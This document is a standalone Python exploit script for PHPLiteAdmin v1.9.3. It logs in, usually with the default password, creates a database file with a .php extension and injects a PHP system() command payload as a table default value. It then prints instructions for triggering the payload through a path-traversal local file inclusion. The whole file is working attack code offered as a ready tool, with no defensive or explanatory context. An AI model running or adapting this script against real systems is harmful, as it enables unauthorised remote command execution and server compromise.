#!/usr/bin/python3

import argparse
import re
import requests
import sys
from collections import ChainMap
import random
import string
import urllib.parse
from urllib3.exceptions import InsecureRequestWarning
# Suppress only the single warning from urllib3 needed.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def getCookie(url):
    try:
        r = requests.get(url, verify=False)
        if r.status_code == 200:
            return r.cookies.get_dict()
        else:
            print("[+] Incorrect path")
            sys.exit()
    except requests.exceptions.ConnectionError:
        print("[+] URL cannot be accessed! Please check target URL.")
        sys.exit()
        
def login(url, password, cookies):
    data = {"password": password, "remember": "yes", "login": "Log In", "proc_login": "true"}
    r = requests.post(url+"/index.php", data=data, cookies=cookies, verify=False)
    check = re.search("<span style='color:red;'>Incorrect password.</span>", r.text)
    if check is not None:
        print("[+] Incorrect PHPLiteAdmin password!")
        sys.exit()
    else:
        print("[+] Login successful")
        return r.cookies.get_dict()

def createDB(url, cookies):
    filename = ''.join(random.choice(string.ascii_lowercase) for i in range(4)) + ".php"
    print(f"[+] Creating a database named {filename}")
    r = requests.post(url+"/index.php", data={"new_dbname": filename}, cookies=cookies, verify=False)
    check = re.search(f"<a href='index\.php\?switchdb=([^']+)'[^>]?>{filename}", r.text)
    if check is not None:
        path = urllib.parse.unquote(check.group(1))
        print(f'[+] Database created at {path}')
        return path
    else:
        print("[+] Error creating database!")
        sys.exit()

def createTable(url, cookies, path, command):
    requests.get(url+f"/index.php?switchdb={path}", verify=False, cookies=cookies)
    print(f"[+] Creating database '{path}' table")
    requests.post(url+"/index.php?action=table_create", cookies=cookies, data={"tablename": "pwn", "tablefields": "1", "createtable": "Go"}, verify=False)
    # change to shell_exec if system not working
    data = {"tablename": "pwn", "rows": "1", "0_field": "pwn", "0_type": "TEXT","0_defaultvalue": f"<?php system(\"{command}\");?>"}
    print(f"[+] Injecting PHP system('{command}') in database table")
    r = requests.post(url+"/index.php?action=table_create&confirm=1", cookies=cookies, data=data, verify=False)
    if r.status_code == 200:
        print("[+] Malicious table created.")
        print(f"[+] To trigger the payload, chain exploit with LFI. Path: {path}")
        print(f"[+] LFI example: http://test.com/?page=../../..{path}")
        # print(f"[+] Path: {path}")
    else:
        print("[+] Error creating table!")
        sys.exit()
    
parser = argparse.ArgumentParser(description="PHPLiteAdmin v1.9.3 PHP Code Injection + LFI")
parser.add_argument("-u", "--url", help="Target PHPLiteAdmin URL (Ex: http://test.com/phpliteadmin/)")
parser.add_argument("-x", "--command", help="Command to execute")
parser.add_argument("-p", "--password", help="PHPLiteAdmin password", default="password")
args = parser.parse_args()
url = args.url
command = args.command
password = args.password
if len(sys.argv) < 2:
    print("[+] Arguments required! Please use -h for more details.")
else:
    if url and command and password is not None:
        cookies = getCookie(url)
        cookies = dict(ChainMap(cookies, login(url, password, cookies)))
        path = createDB(url, cookies)
        createTable(url, cookies, path, command)
    else:
        print("[+] Missing arguments!")
